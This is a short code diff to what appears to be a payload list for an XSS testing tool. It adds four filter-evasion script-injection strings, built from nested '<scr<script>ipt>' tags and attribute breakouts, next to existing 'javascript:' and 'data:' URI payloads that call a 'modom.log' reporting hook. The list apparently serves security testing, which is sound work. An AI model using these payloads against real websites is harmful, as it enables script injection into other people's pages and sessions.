@@ -21,5 +21,9 @@ export default {
   20: `javascript:modom.log('#{REPORT}')`,
   21: `java%0ascript:modom.log('#{REPORT}')`,
   22: `javascript://%0Amodom.log('#{REPORT}')`,
-  23: `data:text/html,<script>modom.log('#{REPORT}')</script>`
+  23: `data:text/html,<script>modom.log('#{REPORT}')</script>`,
+  24: `<scr<script>ipt>modom.log('#{REPORT}')</scr</script>ipt>`,
+  25: `"><scr<script>ipt>modom.log('#{REPORT}')</scr</script>ipt>`,
+  26: `<scr<sc<script>ript>ipt>modom.log('#{REPORT}')</scr</sc</script>ript>ipt>`,
+  27: `"><scr<sc<script>ript>ipt>modom.log('#{REPORT}')</scr</sc</script>ript>ipt>`
 };
